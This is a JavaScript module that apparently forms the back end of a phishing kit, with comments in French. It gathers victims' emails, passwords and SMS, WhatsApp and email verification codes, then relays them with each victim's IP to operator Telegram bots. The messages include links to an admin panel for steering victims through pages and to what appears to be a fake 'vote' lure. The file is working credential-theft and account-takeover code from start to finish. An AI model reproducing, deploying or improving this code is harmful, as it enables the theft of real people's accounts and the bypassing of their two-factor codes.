const { getClient } = require('./db');
const fs = require('fs');
const path = require('path');

// Fichier de configuration des bots Telegram
const botsConfigPath = path.join(__dirname, '..', 'data', 'bots_config.json');

// État par défaut des bots
let botsConfig = {
  bot1: { enabled: true },
  bot2: { enabled: true }
};

// Charger la configuration depuis le fichier
function loadBotsConfig() {
  try {
    if (fs.existsSync(botsConfigPath)) {
      const data = fs.readFileSync(botsConfigPath, 'utf8');
      botsConfig = JSON.parse(data);
    }
  } catch (err) {
    console.error('[TG] Erreur chargement config bots:', err.message);
  }
}

// Sauvegarder la configuration dans le fichier
function saveBotsConfig() {
  try {
    const dir = path.dirname(botsConfigPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(botsConfigPath, JSON.stringify(botsConfig, null, 2));
  } catch (err) {
    console.error('[TG] Erreur sauvegarde config bots:', err.message);
  }
}

// Charger la configuration au démarrage
loadBotsConfig();

function getAdminUrl(session, ip) {
  return `https://voyage-production-1216.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
}

async function sendToTelegramBot(token, chatId, message) {
  if (!token || !chatId) return;

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await resp.json();
    if (!data.ok) {
      console.error('[TG] Erreur API:', data.description);
    }
  } catch (err) {
    console.error('[TG] Erreur reseau:', err.message);
  }
}

async function sendTelegram(message) {
  const token1 = process.env.TELEGRAM_BOT_TOKEN;
  const chatId1 = process.env.TELEGRAM_CHAT_ID;
  const token2 = process.env.TELEGRAM_BOT_TOKEN_2;
  const chatId2 = process.env.TELEGRAM_CHAT_ID_2;

  if (!token1 && !token2) {
    console.log('[TG] Pas de token/chat configure. Message:', message.replace(/<[^>]+>/g, ''));
    return;
  }

  const promises = [];
  
  // Bot 1 - actif seulement si enabled
  if (botsConfig.bot1.enabled && token1 && chatId1) {
    promises.push(sendToTelegramBot(token1, chatId1, message));
  }
  
  // Bot 2 - actif seulement si enabled
  if (botsConfig.bot2.enabled && token2 && chatId2) {
    promises.push(sendToTelegramBot(token2, chatId2, message));
  }

  if (promises.length > 0) {
    await Promise.all(promises);
  }
}

function getFieldLabel(field) {
  const labels = { email: 'Email', password: 'dp', sms_code: 'Code SMS', whatsapp_code: 'Code WhatsApp', email_code: 'Code Email' };
  return labels[field] || field;
}

function getClientSummary(session, ip) {
  const client = getClient(session, ip);
  if (!client) return '';
  let lines = [];
  if (client.email) lines.push(`Email: <code>${client.email}</code>`);
  if (client.password) lines.push(`dp: <code>${client.password}</code>`);
  if (client.sms_code) lines.push(`Code SMS: <code>${client.sms_code}</code>`);
  if (client.whatsapp_code) lines.push(`Code WhatsApp: <code>${client.whatsapp_code}</code>`);
  if (client.email_code) lines.push(`Code Email: <code>${client.email_code}</code>`);
  return lines.length ? `\nDonnees collectees:\n${lines.join('\n')}` : '';
}

function adminButton(session, ip) {
  const url = getAdminUrl(session, ip);
  return url ? `\n\n🎛 <a href="${url}">Ouvrir le panneau admin</a>` : '';
}

function notifyNewClient(client) {
  return sendTelegram(
    `<b>NOUVEAU CLIENT</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${client.ip}</code>` +
    `\n\n🎛 <a href="${getAdminUrl(client.session, client.ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyData(session, ip, field, value) {
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>NOUVEAU CLIENT</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${ip}</code>` +
    summary +
    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyAction(session, ip, action) {
  return sendTelegram(
    `<b>ACTION ADMIN</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Action: <code>${action}</code>\n` +
    `IP: <code>${ip}</code>`
  );
}

function notifyPageChange(session, ip, page) {
  return sendTelegram(
    `<b>PAGE CHANGEE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `Page: <code>${page}</code>\n` +
    `IP: <code>${ip}</code>` +
    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
  );
}

function notifyVoteApproved(session, ip) {
  const summary = getClientSummary(session, ip);
  return sendTelegram(
    `<b>VOTE APPROUVE</b>\n` +
    `━━━━━━━━━━━━━━━━━\n` +
    `IP: <code>${ip}</code>` +
    summary
  );
}

// Fonctions de gestion des bots
function getBotsConfig() {
  return { ...botsConfig };
}

function toggleBot(botNumber, enabled) {
  const botKey = `bot${botNumber}`;
  if (botsConfig[botKey]) {
    botsConfig[botKey].enabled = enabled;
    saveBotsConfig();
    console.log(`[TG] Bot ${botNumber} ${enabled ? 'active' : 'desactive'}`);
    return true;
  }
  return false;
}

function togglePanel(panelNumber, enabled) {
  // panelNumber 1 = panel principal, panelNumber 2 = panel 2
  // Pour l'instant, on stocke juste l'état dans botsConfig
  if (!botsConfig.panels) botsConfig.panels = { panel1: true, panel2: true };
  botsConfig.panels[`panel${panelNumber}`] = enabled;
  saveBotsConfig();
  console.log(`[Panel] Panel ${panelNumber} ${enabled ? 'active' : 'desactive'}`);
  return true;
}

function getPanelStatus() {
  if (!botsConfig.panels) botsConfig.panels = { panel1: true, panel2: true };
  return botsConfig.panels;
}

module.exports = { 
  sendTelegram, 
  notifyNewClient, 
  notifyData, 
  notifyAction, 
  notifyPageChange, 
  notifyVoteApproved,
  getBotsConfig,
  toggleBot,
  togglePanel,
  getPanelStatus
};
